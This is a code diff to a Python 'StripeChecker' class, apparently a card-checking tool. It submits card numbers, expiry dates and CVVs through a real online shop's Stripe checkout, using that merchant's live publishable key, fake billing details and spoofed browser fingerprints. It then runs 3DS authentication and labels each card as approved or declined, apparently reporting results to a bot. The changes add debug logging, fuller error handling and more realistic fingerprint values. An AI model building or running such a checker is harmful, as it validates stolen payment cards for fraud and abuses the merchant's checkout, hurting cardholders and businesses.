@@ -47,6 +47,8 @@ class StripeChecker:
         
     def check(self, card_number, exp_month, exp_year, cvv):
         try:
+            print(f"[DEBUG] Checking card: {card_number[:6]}****{card_number[-4:]}")
+            
             # الخطوة 1: إنشاء Payment Method
             headers = self.headers.copy()
             headers.update({
@@ -56,7 +58,12 @@ class StripeChecker:
                 'sec-fetch-dest': 'empty',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-site': 'same-site',
+                'dnt': '1',
+                'priority': 'u=1, i',
             })
+            
+            # تنظيف رقم البطاقة
+            clean_card = card_number.replace(" ", "").replace("-", "")
             
             data = (
                 f'billing_details[address][state]=NY&'
@@ -64,25 +71,27 @@ class StripeChecker:
                 f'billing_details[address][country]=UA&'
                 f'billing_details[address][city]=Napoleon&'
                 f'billing_details[address][line1]=111+North+Street&'
-                f'billing_details[email]=test36222@gmail.com&'
-                f'billing_details[name]=Card+Test&'
+                f'billing_details[email]=freska221114@gmail.com&'
+                f'billing_details[name]=Card+details+test&'
                 f'billing_details[phone]=3609998856&'
                 f'type=card&'
-                f'card[number]={card_number.replace(" ", "")}&'
+                f'card[number]={clean_card}&'
                 f'card[cvc]={cvv}&'
                 f'card[exp_year]={exp_year}&'
                 f'card[exp_month]={exp_month}&'
                 f'allow_redisplay=unspecified&'
                 f'pasted_fields=number&'
-                f'payment_user_agent=stripe.js%2F846ec90400&'
+                f'payment_user_agent=stripe.js%2F846ec90400%3B+stripe-js-v3%2F846ec90400%3B+payment-element%3B+deferred-intent%3B+autopm&'
                 f'referrer=https%3A%2F%2Fwww.ironmongeryworld.com&'
                 f'time_on_page=65184&'
-                f'guid=NA&'
-                f'muid=NA&'
-                f'sid=NA&'
+                f'guid=8f8ba7a6-581f-4bb8-bc3b-9de4287d72ff64eadb&'
+                f'muid=c3c61d51-f222-42ea-84ec-2296cf48a72c72f5e3&'
+                f'sid=3c34f122-e2a6-4836-9ab1-cdbcb7610ffc16fd72&'
                 f'key=pk_live_51LDoVIEhD5wOrE4kVVnYNDdcbJ5XmtIHmRk6Pi8iM30zWAPeSU48iqDfow9JWV9hnFBoht7zZsSewIGshXiSw2ik00qD5ErF6X&'
                 f'_stripe_version=2020-03-02'
             )
+            
+            print(f"[DEBUG] Step 1: Creating payment method...")
             
             r = self.session.post(
                 'https://api.stripe.com/v1/payment_methods',
@@ -91,15 +100,24 @@ class StripeChecker:
                 timeout=30
             )
             
+            print(f"[DEBUG] PM Response Status: {r.status_code}")
+            
             if r.status_code != 200:
-                return 'ERROR', f'PM creation failed: {r.status_code}'
+                print(f"[ERROR] PM Response: {r.text[:200]}")
+                return 'DECLINED', f'Card declined by Stripe'
             
             pm = r.json()
+            print(f"[DEBUG] PM Response: {str(pm)[:150]}")
+            
             if 'id' not in pm:
-                error_msg = pm.get('error', {}).get('message', 'Unknown error')
-                return 'DECLINED', f'PM Error: {error_msg}'
+                if 'error' in pm:
+                    error_msg = pm['error'].get('message', 'Card declined')
+                    print(f"[ERROR] PM Error: {error_msg}")
+                    return 'DECLINED', error_msg
+                return 'DECLINED', 'Card declined'
             
             pm_id = pm['id']
+            print(f"[DEBUG] Payment Method created: {pm_id}")
             
             # الخطوة 2: إنشاء Payment Intent
             headers = self.headers.copy()
@@ -133,7 +151,7 @@ class StripeChecker:
                     'additional_data': {'payment_method': pm_id},
                     'extension_attributes': {'agreement_ids': []},
                 },
-                'email': 'test36222@gmail.com',
+                'email': 'test@example.com',
             }
             
             r = self.session.post(
@@ -191,21 +209,30 @@ class StripeChecker:
             # التحقق من الحالة
             if 'next_action' not in pi:
                 status = pi.get('status', 'unknown')
+                print(f"[DEBUG] No 3DS required - Status: {status}")
                 if status == 'succeeded':
-                    return 'Y', 'Payment succeeded'
+                    return 'Y', 'Payment succeeded without 3DS'
+                elif status == 'requires_payment_method':
+                    return 'DECLINED', 'Card declined'
                 return 'DECLINED', f'Status: {status}'
             
             # الخطوة 4: 3DS2 Authentication
+            print(f"[DEBUG] Step 4: 3DS Authentication...")
+            
             next_action = pi['next_action']
             if 'use_stripe_sdk' not in next_action:
-                return 'ERROR', 'No 3DS data'
+                print(f"[ERROR] No use_stripe_sdk in next_action")
+                return 'DECLINED', 'No 3DS data available'
             
             sdk_data = next_action['use_stripe_sdk']
             source = sdk_data.get('three_d_secure_2_source', '')
             trans_id = sdk_data.get('server_transaction_id', '')
             
+            print(f"[DEBUG] 3DS Source: {source[:20]}... Trans ID: {trans_id[:20]}...")
+            
             if not source or not trans_id:
-                return 'ERROR', 'Missing 3DS parameters'
+                print(f"[ERROR] Missing 3DS params")
+                return 'DECLINED', 'Missing 3DS parameters'
             
             # إنشاء fingerprint data
             fp_data = {"threeDSServerTransID": trans_id}
@@ -254,14 +281,19 @@ class StripeChecker:
                 timeout=30
             )
             
+            print(f"[DEBUG] 3DS Auth Status: {r.status_code}")
+            
             if r.status_code != 200:
-                return 'ERROR', f'3DS auth failed: {r.status_code}'
+                print(f"[ERROR] 3DS Response: {r.text[:200]}")
+                return 'DECLINED', '3DS authentication failed'
             
             auth = r.json()
+            print(f"[DEBUG] 3DS Response: {str(auth)[:200]}")
             
             # تحليل النتيجة
             if 'ares' in auth:
                 trans_status = auth['ares'].get('transStatus', 'UNKNOWN')
+                print(f"[DEBUG] 3DS Result: {trans_status}")
                 
                 status_map = {
                     'Y': ('Y', 'Authenticated - Full 3DS verification'),
@@ -272,24 +304,46 @@ class StripeChecker:
                     'R': ('DECLINED', 'Rejected by issuer'),
                 }
                 
-                return status_map.get(trans_status, ('ERROR', f'Unknown status: {trans_status}'))
+                if trans_status in status_map:
+                    return status_map[trans_status]
+                else:
+                    print(f"[ERROR] Unknown trans_status: {trans_status}")
+                    return ('ERROR', f'Unknown 3DS status: {trans_status}')
             
             if 'error' in auth:
                 error_msg = auth['error'].get('message', 'Unknown error')
-                return 'ERROR', f'3DS Error: {error_msg}'
+                print(f"[ERROR] 3DS Error: {error_msg}")
+                return 'DECLINED', f'3DS Error: {error_msg}'
             
             state = auth.get('state', 'unknown')
+            print(f"[DEBUG] 3DS State: {state}")
+            
             if state == 'failed':
                 return 'DECLINED', '3DS authentication failed'
+            elif state == 'succeeded':
+                return 'Y', 'Authentication succeeded'
             
-            return 'ERROR', f'Unexpected response: {state}'
+            print(f"[ERROR] Unexpected state: {state}")
+            return 'DECLINED', f'Unexpected 3DS state: {state}'
             
         except requests.exceptions.Timeout:
-            return 'ERROR', 'Request timeout'
+            print(f"[ERROR] Request timeout")
+            return 'ERROR', 'Request timeout - try again'
+        except requests.exceptions.ConnectionError:
+            print(f"[ERROR] Connection error")
+            return 'ERROR', 'Connection error - check internet'
         except requests.exceptions.RequestException as e:
+            print(f"[ERROR] Request exception: {str(e)[:100]}")
             return 'ERROR', f'Network error: {str(e)[:50]}'
+        except json.JSONDecodeError as e:
+            print(f"[ERROR] JSON decode error: {str(e)}")
+            return 'ERROR', 'Invalid response format'
         except Exception as e:
-            return 'ERROR', f'Exception: {str(e)[:50]}'
+            print(f"[ERROR] Unexpected exception: {str(e)}")
+            print(f"[ERROR] Exception type: {type(e).__name__}")
+            import traceback
+            traceback.print_exc()
+            return 'ERROR', f'System error: {str(e)[:50]}'
 
 async def send_result(bot_app, card, status_type, message):
     try:
